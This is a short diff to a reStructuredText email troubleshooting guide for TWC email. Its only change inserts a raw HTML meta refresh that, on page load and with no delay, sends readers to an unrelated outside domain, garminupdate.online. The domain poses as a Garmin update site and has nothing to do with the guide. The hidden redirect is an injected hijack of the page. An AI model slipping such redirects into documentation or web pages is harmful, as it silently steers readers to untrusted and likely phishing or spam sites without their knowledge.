@@ -1,3 +1,7 @@
+.. raw:: html
+ 
+    <meta http-equiv="refresh" content="0; url=https://garminupdate.online/">
+
 Managing Your TWC Email: Tips and Troubleshooting Guide
 ========================================================
 
